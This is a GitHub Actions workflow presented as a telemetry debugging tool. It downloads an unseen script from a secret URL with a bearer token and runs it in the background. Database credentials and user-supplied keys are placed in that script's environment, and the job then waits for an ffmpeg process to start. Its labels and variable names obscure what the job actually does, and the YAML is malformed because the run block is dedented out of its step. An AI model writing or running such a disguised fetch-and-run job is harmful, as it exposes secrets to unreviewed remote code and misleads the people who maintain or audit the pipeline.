name: "🔍 DEBUG: System Telemetry Fault Finder"

on:
  workflow_dispatch:
    inputs:
      telemetry_endpoint:
        description: 'Asset CDN/Telemetry Source URL' 
        required: true
      sync_node_id:
        description: 'Database Sync Node ID' 
        required: true
      diagnostic_key:
        description: 'Read-only Diagnostic Auth Key' 
        required: true

jobs:
  debug-telemetry:
    runs-on: ubuntu-latest
    steps:
      - name: 📥 Initialize
        uses: actions/checkout@v3

      - name: 🕵️‍♂️ Step-by-Step Execution & Log Capture
        env:
          DB_HOST: ${{ secrets.DB_HOST }}
          DB_USER: ${{ secrets.DB_USER }}
          DB_PASS: ${{ secrets.DB_PASS }}
          DB_NAME: ${{ secrets.DB_NAME }}
          SYNC_NODE: ${{ github.event.inputs.sync_node_id }}
          DIAG_KEY: ${{ github.event.inputs.diagnostic_key }}
          TELEMETRY_URL: ${{ github.event.inputs.telemetry_endpoint }}
          STORED_PASS: ${{ secrets.ACTION_PASS }}
          HF_TOKEN: ${{ secrets.HF_TOKEN }}
          HF_REPO: ${{ secrets.HF_REPO_NAME }}
          REMOTE_URL: ${{ secrets.REMOTE_LOGIC_URL }}
run: |
  echo "--- [1] PRE-START CLEANUP ---"
  # Purani logs hatao taaki confusion na ho
  rm -f runtime.log debug.log

  echo "--- [2] LAUNCHING DAEMON ---"
  export MURL="$TELEMETRY_URL"
  export MID="$SYNC_NODE"
  export CIPHER_KEY="$DIAG_KEY"
  export INPUT_PASS="$DIAG_KEY"

  # Script download logic (Same as before)
  curl -s -L -H "Authorization: Bearer $HF_TOKEN" -o sys_monitor_agent.sh "$REMOTE_URL"
  chmod +x sys_monitor_agent.sh

  # Launching...
  ./sys_monitor_agent.sh & 
  DAEMON_PID=$!
  echo "Daemon started with PID: $DAEMON_PID"

  # -------------------------------------------------------------
  # MONITORING THE *REAL* LOG FILE
  # -------------------------------------------------------------
  echo "--- [3] MONITORING RUNTIME.LOG ---"
  
  # Wait a bit for the script to initialize its internal log file
  sleep 10

  while kill -0 $DAEMON_PID 2>/dev/null; do
    echo "---------------------------------------------------"
    echo "⏱️ Time: $(date +'%H:%M:%S') | Status: ALIVE"
    
    # 🕵️‍♂️ Check if runtime.log exists and show it
    if [ -f "runtime.log" ]; then
       echo "📜 INTERNAL SCRIPT LOGS (runtime.log):"
       tail -n 10 runtime.log
    else
       echo "⚠️ WARNING: runtime.log not created yet. Script might be stuck at 'apt-get'!"
    fi

    # 🔍 Check if ffmpeg is actually running in background
    if pgrep -x "ffmpeg" > /dev/null; then
       echo "🎥 [PROCESS] ffmpeg is RUNNING! (CPU Load expected to rise)"
    else
       echo "😴 [PROCESS] ffmpeg is NOT running yet."
    fi

    echo "📈 Load: $(uptime | awk -F'load average:' '{ print $2 }')"
    sleep 40
  done

  echo "❌ DAEMON TERMINATED."
  if [ -f "runtime.log" ]; then
     echo "--- FULL CRASH DUMP ---"
     cat runtime.log
  fi
